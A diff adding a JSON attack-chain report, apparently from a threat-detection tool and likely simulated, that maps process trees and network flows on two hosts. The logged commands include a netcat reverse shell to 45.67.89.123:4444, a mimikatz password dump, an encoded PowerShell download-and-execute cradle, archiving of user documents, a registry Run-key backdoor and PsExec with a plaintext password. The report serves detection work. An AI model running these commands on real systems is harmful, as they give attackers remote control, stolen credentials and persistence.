@@ -1,0 +1,2015 @@
+{
+  "analysis_time": "2026-01-13T02:31:17.390998",
+  "time_range_hours": 24,
+  "attack_chains": {
+    "total_count": 19,
+    "chains": [
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 8888,
+            "name": null,
+            "command": null,
+            "first_seen": "2026-01-12T22:37:17.811732",
+            "path": null,
+            "lifecycle_version": 2
+          },
+          {
+            "pid": 9001,
+            "name": "cmd.exe",
+            "command": "cmd.exe /c whoami",
+            "first_seen": "2026-01-12T22:19:38.607177",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "lifecycle_version": 19
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:45+00:00",
+            "event_id": "c31356367401644e02b2e7bdb26c502d"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 8888,
+            "name": null,
+            "command": null,
+            "first_seen": "2026-01-12T22:37:17.811732",
+            "path": null,
+            "lifecycle_version": 2
+          },
+          {
+            "pid": 9001,
+            "name": "cmd.exe",
+            "command": "cmd.exe /c whoami",
+            "first_seen": "2026-01-12T22:19:38.607177",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "lifecycle_version": 19
+          },
+          {
+            "pid": 9002,
+            "name": "nc.exe",
+            "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+            "first_seen": "2026-01-12T22:19:32.712325",
+            "path": "C:\\Temp\\nc.exe",
+            "lifecycle_version": 17
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:03+00:00",
+            "event_id": "df1ee0c160296154163c6ba17b6051aa"
+          },
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:45+00:00",
+            "event_id": "c31356367401644e02b2e7bdb26c502d"
+          }
+        ],
+        "chain_length": 3,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 8888,
+            "name": null,
+            "command": null,
+            "first_seen": "2026-01-12T22:37:17.811732",
+            "path": null,
+            "lifecycle_version": 2
+          },
+          {
+            "pid": 9001,
+            "name": "cmd.exe",
+            "command": "cmd.exe /c whoami",
+            "first_seen": "2026-01-12T22:19:38.607177",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "lifecycle_version": 19
+          },
+          {
+            "pid": 9002,
+            "name": "nc.exe",
+            "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+            "first_seen": "2026-01-12T22:19:32.712325",
+            "path": "C:\\Temp\\nc.exe",
+            "lifecycle_version": 17
+          },
+          {
+            "pid": 9003,
+            "name": "mimikatz.exe",
+            "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+            "first_seen": "2026-01-12T22:19:33.044676",
+            "path": "C:\\Temp\\mimikatz.exe",
+            "lifecycle_version": 8
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:03+00:00",
+            "event_id": "df1ee0c160296154163c6ba17b6051aa"
+          },
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:45+00:00",
+            "event_id": "c31356367401644e02b2e7bdb26c502d"
+          },
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:51+00:00",
+            "event_id": "c08e9db5bc472ef8121d96ecd7e685d9"
+          }
+        ],
+        "chain_length": 4,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "002",
+        "chain": [
+          {
+            "pid": 9004,
+            "name": null,
+            "command": null,
+            "first_seen": "2026-01-12T22:19:38.942019",
+            "path": null,
+            "lifecycle_version": 7
+          },
+          {
+            "pid": 9005,
+            "name": "powershell.exe",
+            "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+            "first_seen": "2026-01-12T22:19:38.891894",
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "lifecycle_version": 11
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:57+00:00",
+            "event_id": "81c6176465f00f81385a3ff26692b2f8"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "002",
+        "chain": [
+          {
+            "pid": 9005,
+            "name": "powershell.exe",
+            "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+            "first_seen": "2026-01-12T22:19:38.891894",
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "lifecycle_version": 11
+          },
+          {
+            "pid": 9285,
+            "name": "tar.exe",
+            "command": "tar.exe -czf C:\\Temp\\data.tar.gz C:\\Users\\*\\Documents",
+            "first_seen": "2026-01-12T22:37:28.037149",
+            "path": "C:\\Windows\\System32\\tar.exe",
+            "lifecycle_version": 1
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T14:37:24+00:00",
+            "event_id": "305ecabb390feea5164b016c64b67baa"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "002",
+        "chain": [
+          {
+            "pid": 9005,
+            "name": "powershell.exe",
+            "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+            "first_seen": "2026-01-12T22:19:38.891894",
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "lifecycle_version": 11
+          },
+          {
+            "pid": 9253,
+            "name": "tar.exe",
+            "command": "tar.exe -czf C:\\Temp\\data.tar.gz C:\\Users\\*\\Documents",
+            "first_seen": "2026-01-12T22:37:43.646370",
+            "path": "C:\\Windows\\System32\\tar.exe",
+            "lifecycle_version": 1
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T14:37:42+00:00",
+            "event_id": "b5bb94f001f0a3e0ea34a426beef6c9b"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "002",
+        "chain": [
+          {
+            "pid": 9005,
+            "name": "powershell.exe",
+            "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+            "first_seen": "2026-01-12T22:19:38.891894",
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "lifecycle_version": 11
+          },
+          {
+            "pid": 9234,
+            "name": "tar.exe",
+            "command": "tar.exe -czf C:\\Temp\\data.tar.gz C:\\Users\\*\\Documents",
+            "first_seen": "2026-01-13T02:25:58.973670",
+            "path": "C:\\Windows\\System32\\tar.exe",
+            "lifecycle_version": 1
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:25:54+00:00",
+            "event_id": "b2abeaad6fd1958ee5df5cf187d6129c"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "002",
+        "chain": [
+          {
+            "pid": 9005,
+            "name": "powershell.exe",
+            "command": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+            "first_seen": "2026-01-12T22:19:38.891894",
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "lifecycle_version": 11
+          },
+          {
+            "pid": 9243,
+            "name": "tar.exe",
+            "command": "tar.exe -czf C:\\Temp\\data.tar.gz C:\\Users\\*\\Documents",
+            "first_seen": "2026-01-13T02:26:35.323093",
+            "path": "C:\\Windows\\System32\\tar.exe",
+            "lifecycle_version": 1
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:33+00:00",
+            "event_id": "a493b80e83f0c6db88666ae7d075ed01"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 9001,
+            "name": "cmd.exe",
+            "command": "cmd.exe /c whoami",
+            "first_seen": "2026-01-12T22:19:38.607177",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "lifecycle_version": 19
+          },
+          {
+            "pid": 9004,
+            "name": "PsExec.exe",
+            "command": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe",
+            "first_seen": "2026-01-12T22:19:38.555442",
+            "path": "C:\\Windows\\PsExec.exe",
+            "lifecycle_version": 6
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:54+00:00",
+            "event_id": "f52b3498a8714ef7e6cc37391c94e5af"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 9001,
+            "name": "cmd.exe",
+            "command": "cmd.exe /c whoami",
+            "first_seen": "2026-01-12T22:19:38.607177",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "lifecycle_version": 19
+          },
+          {
+            "pid": 9002,
+            "name": "nc.exe",
+            "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+            "first_seen": "2026-01-12T22:19:32.712325",
+            "path": "C:\\Temp\\nc.exe",
+            "lifecycle_version": 17
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:03+00:00",
+            "event_id": "df1ee0c160296154163c6ba17b6051aa"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 9001,
+            "name": "cmd.exe",
+            "command": "cmd.exe /c whoami",
+            "first_seen": "2026-01-12T22:19:38.607177",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "lifecycle_version": 19
+          },
+          {
+            "pid": 9002,
+            "name": "nc.exe",
+            "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+            "first_seen": "2026-01-12T22:19:32.712325",
+            "path": "C:\\Temp\\nc.exe",
+            "lifecycle_version": 17
+          },
+          {
+            "pid": 9003,
+            "name": "mimikatz.exe",
+            "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+            "first_seen": "2026-01-12T22:19:33.044676",
+            "path": "C:\\Temp\\mimikatz.exe",
+            "lifecycle_version": 8
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:03+00:00",
+            "event_id": "df1ee0c160296154163c6ba17b6051aa"
+          },
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:51+00:00",
+            "event_id": "c08e9db5bc472ef8121d96ecd7e685d9"
+          }
+        ],
+        "chain_length": 3,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 9001,
+            "name": "cmd.exe",
+            "command": "cmd.exe /c whoami",
+            "first_seen": "2026-01-12T22:19:38.607177",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "lifecycle_version": 19
+          },
+          {
+            "pid": 9106,
+            "name": "reg.exe",
+            "command": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+            "first_seen": "2026-01-12T22:37:07.258142",
+            "path": "C:\\Windows\\System32\\reg.exe",
+            "lifecycle_version": 1
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T14:37:03+00:00",
+            "event_id": "43ab862f117583ee1b49ba5d8690ab55"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 9001,
+            "name": "cmd.exe",
+            "command": "cmd.exe /c whoami",
+            "first_seen": "2026-01-12T22:19:38.607177",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "lifecycle_version": 19
+          },
+          {
+            "pid": 9152,
+            "name": "reg.exe",
+            "command": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+            "first_seen": "2026-01-12T22:37:53.929504",
+            "path": "C:\\Windows\\System32\\reg.exe",
+            "lifecycle_version": 1
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T14:37:51+00:00",
+            "event_id": "be227df32716b4e85bcd2cf8838f2c22"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 9001,
+            "name": "cmd.exe",
+            "command": "cmd.exe /c whoami",
+            "first_seen": "2026-01-12T22:19:38.607177",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "lifecycle_version": 19
+          },
+          {
+            "pid": 9147,
+            "name": "reg.exe",
+            "command": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+            "first_seen": "2026-01-13T01:43:55.243880",
+            "path": "C:\\Windows\\System32\\reg.exe",
+            "lifecycle_version": 1
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T17:43:50+00:00",
+            "event_id": "67871e2dc9a8b9379e338d0fe9f987af"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 9001,
+            "name": "cmd.exe",
+            "command": "cmd.exe /c whoami",
+            "first_seen": "2026-01-12T22:19:38.607177",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "lifecycle_version": 19
+          },
+          {
+            "pid": 9195,
+            "name": "reg.exe",
+            "command": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+            "first_seen": "2026-01-13T02:25:38.372302",
+            "path": "C:\\Windows\\System32\\reg.exe",
+            "lifecycle_version": 1
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:25:36+00:00",
+            "event_id": "fe99f4c6db86fdfb8ced72d695008043"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 9001,
+            "name": "cmd.exe",
+            "command": "cmd.exe /c whoami",
+            "first_seen": "2026-01-12T22:19:38.607177",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "lifecycle_version": 19
+          },
+          {
+            "pid": 9129,
+            "name": "reg.exe",
+            "command": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+            "first_seen": "2026-01-13T02:25:43.611899",
+            "path": "C:\\Windows\\System32\\reg.exe",
+            "lifecycle_version": 1
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:25:42+00:00",
+            "event_id": "ab878a1375128810007693252d596306"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 9001,
+            "name": "cmd.exe",
+            "command": "cmd.exe /c whoami",
+            "first_seen": "2026-01-12T22:19:38.607177",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "lifecycle_version": 19
+          },
+          {
+            "pid": 9145,
+            "name": "reg.exe",
+            "command": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+            "first_seen": "2026-01-13T02:26:19.652811",
+            "path": "C:\\Windows\\System32\\reg.exe",
+            "lifecycle_version": 1
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:15+00:00",
+            "event_id": "7d0c8e344720ed3535d5d27ff6741053"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 9001,
+            "name": "cmd.exe",
+            "command": "cmd.exe /c whoami",
+            "first_seen": "2026-01-12T22:19:38.607177",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "lifecycle_version": 19
+          },
+          {
+            "pid": 9141,
+            "name": "reg.exe",
+            "command": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe",
+            "first_seen": "2026-01-13T02:26:24.905484",
+            "path": "C:\\Windows\\System32\\reg.exe",
+            "lifecycle_version": 1
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:21+00:00",
+            "event_id": "34768d47181b4edb1260fb66160db998"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      },
+      {
+        "host_id": "001",
+        "chain": [
+          {
+            "pid": 9002,
+            "name": "nc.exe",
+            "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+            "first_seen": "2026-01-12T22:19:32.712325",
+            "path": "C:\\Temp\\nc.exe",
+            "lifecycle_version": 17
+          },
+          {
+            "pid": 9003,
+            "name": "mimikatz.exe",
+            "command": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
+            "first_seen": "2026-01-12T22:19:33.044676",
+            "path": "C:\\Temp\\mimikatz.exe",
+            "lifecycle_version": 8
+          }
+        ],
+        "edges": [
+          {
+            "type": "SPAWNED",
+            "timestamp": "2026-01-12T18:26:51+00:00",
+            "event_id": "c08e9db5bc472ef8121d96ecd7e685d9"
+          }
+        ],
+        "chain_length": 2,
+        "type": "process_tree"
+      }
+    ],
+    "network_connections": [
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.110",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "172.217.0.46",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 80,
+            "protocol": "tcp",
+            "timestamp": "2026-01-12T14:19:41.715091+00:00",
+            "bytes_sent": 2913,
+            "bytes_received": 17472
+          }
+        ],
+        "path_length": 2,
+        "src_ip": "192.168.1.110",
+        "dst_ip": "172.217.0.46",
+        "type": "network_connection"
+      },
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.110",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "13.107.21.200",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 53,
+            "protocol": "tcp",
+            "timestamp": "2026-01-12T17:43:38.641957+00:00",
+            "bytes_sent": 3339,
+            "bytes_received": 47026
+          }
+        ],
+        "path_length": 2,
+        "src_ip": "192.168.1.110",
+        "dst_ip": "13.107.21.200",
+        "type": "network_connection"
+      },
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.108",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "13.107.21.200",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 443,
+            "protocol": "tcp",
+            "timestamp": "2026-01-12T18:25:33.296034+00:00",
+            "bytes_sent": 3251,
+            "bytes_received": 33929
+          }
+        ],
+        "path_length": 2,
+        "src_ip": "192.168.1.108",
+        "dst_ip": "13.107.21.200",
+        "type": "network_connection"
+      },
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.107",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "172.217.0.46",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 443,
+            "protocol": "tcp",
+            "timestamp": "2026-01-12T18:26:39.444674+00:00",
+            "bytes_sent": 2035,
+            "bytes_received": 26828
+          }
+        ],
+        "path_length": 2,
+        "src_ip": "192.168.1.107",
+        "dst_ip": "172.217.0.46",
+        "type": "network_connection"
+      },
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.106",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "13.107.21.200",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 443,
+            "protocol": "udp",
+            "timestamp": "2026-01-12T18:25:51.335249+00:00",
+            "bytes_sent": 3663,
+            "bytes_received": 20323
+          }
+        ],
+        "path_length": 2,
+        "src_ip": "192.168.1.106",
+        "dst_ip": "13.107.21.200",
+        "type": "network_connection"
+      },
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.106",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "172.217.0.46",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 443,
+            "protocol": "udp",
+            "timestamp": "2026-01-12T18:26:45.457943+00:00",
+            "bytes_sent": 4362,
+            "bytes_received": 46197
+          }
+        ],
+        "path_length": 2,
+        "src_ip": "192.168.1.106",
+        "dst_ip": "172.217.0.46",
+        "type": "network_connection"
+      },
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.105",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "172.217.0.46",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 53,
+            "protocol": "udp",
+            "timestamp": "2026-01-12T18:26:12.375765+00:00",
+            "bytes_sent": 1042,
+            "bytes_received": 24892
+          }
+        ],
+        "path_length": 2,
+        "src_ip": "192.168.1.105",
+        "dst_ip": "172.217.0.46",
+        "type": "network_connection"
+      },
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.102",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "13.107.21.200",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 80,
+            "protocol": "udp",
+            "timestamp": "2026-01-12T17:43:53.673402+00:00",
+            "bytes_sent": 248,
+            "bytes_received": 24987
+          }
+        ],
+        "path_length": 2,
+        "src_ip": "192.168.1.102",
+        "dst_ip": "13.107.21.200",
+        "type": "network_connection"
+      },
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.101",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "45.67.89.123",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 443,
+            "protocol": "tcp",
+            "timestamp": "2026-01-12T18:26:42.445124+00:00",
+            "bytes_sent": 37545392,
+            "bytes_received": 7554
+          }
+        ],
+        "path_length": 2,
+        "src_ip": "192.168.1.101",
+        "dst_ip": "45.67.89.123",
+        "type": "network_connection"
+      },
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.101",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "45.67.89.123",
+            "is_private": false,
+            "type": "IP"
+          },
+          {
+            "ip_address": "192.168.1.102",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "13.107.21.200",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 80,
+            "protocol": "udp",
+            "timestamp": "2026-01-12T17:43:53.673402+00:00",
+            "bytes_sent": 248,
+            "bytes_received": 24987
+          },
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 22,
+            "protocol": "tcp",
+            "timestamp": "2026-01-12T18:26:24.408258+00:00",
+            "bytes_sent": 100,
+            "bytes_received": 0
+          },
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 443,
+            "protocol": "tcp",
+            "timestamp": "2026-01-12T18:26:42.445124+00:00",
+            "bytes_sent": 37545392,
+            "bytes_received": 7554
+          }
+        ],
+        "path_length": 4,
+        "src_ip": "192.168.1.101",
+        "dst_ip": "13.107.21.200",
+        "type": "network_connection"
+      },
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.100",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "45.67.89.123",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 4444,
+            "protocol": "tcp",
+            "timestamp": "2026-01-12T18:26:51.464663+00:00",
+            "bytes_sent": 83223,
+            "bytes_received": 525221
+          }
+        ],
+        "path_length": 2,
+        "src_ip": "192.168.1.100",
+        "dst_ip": "45.67.89.123",
+        "type": "network_connection"
+      },
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.100",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "45.67.89.123",
+            "is_private": false,
+            "type": "IP"
+          },
+          {
+            "ip_address": "192.168.1.102",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "13.107.21.200",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 80,
+            "protocol": "udp",
+            "timestamp": "2026-01-12T17:43:53.673402+00:00",
+            "bytes_sent": 248,
+            "bytes_received": 24987
+          },
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 22,
+            "protocol": "tcp",
+            "timestamp": "2026-01-12T18:26:24.408258+00:00",
+            "bytes_sent": 100,
+            "bytes_received": 0
+          },
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 4444,
+            "protocol": "tcp",
+            "timestamp": "2026-01-12T18:26:51.464663+00:00",
+            "bytes_sent": 83223,
+            "bytes_received": 525221
+          }
+        ],
+        "path_length": 4,
+        "src_ip": "192.168.1.100",
+        "dst_ip": "13.107.21.200",
+        "type": "network_connection"
+      },
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.100",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "192.168.1.101",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "45.67.89.123",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 443,
+            "protocol": "tcp",
+            "timestamp": "2026-01-12T18:26:42.445124+00:00",
+            "bytes_sent": 37545392,
+            "bytes_received": 7554
+          },
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 445,
+            "protocol": "tcp",
+            "timestamp": "2026-01-12T18:26:54.480640+00:00",
+            "bytes_sent": 46618,
+            "bytes_received": 3695
+          }
+        ],
+        "path_length": 3,
+        "src_ip": "192.168.1.100",
+        "dst_ip": "45.67.89.123",
+        "type": "network_connection"
+      },
+      {
+        "path": [
+          {
+            "ip_address": "192.168.1.100",
+            "is_private": true,
+            "type": "IP"
+          },
+          {
+            "ip_address": "172.217.0.46",
+            "is_private": false,
+            "type": "IP"
+          }
+        ],
+        "edges": [
+          {
+            "type": "CONNECTED_TO",
+            "dst_port": 53,
+            "protocol": "tcp",
+            "timestamp": "2026-01-12T18:26:03.358481+00:00",
+            "bytes_sent": 3175,
+            "bytes_received": 12165
+          }
+        ],
+        "path_length": 2,
+        "src_ip": "192.168.1.100",
+        "dst_ip": "172.217.0.46",
+        "type": "network_connection"
+      }
+    ],
+    "suspicious_ips": [
+      "45.67.89.123",
+      "172.217.0.46",
+      "13.107.21.200"
+    ],
+    "suspicious_processes": [
+      {
+        "pid": 9002,
+        "name": "nc.exe",
+        "command": "nc.exe -e cmd.exe 45.67.89.123 4444",
+        "first_seen": "2026-01-12T22:19:32.712325",
+        "path": "C:\\Temp\\nc.exe",
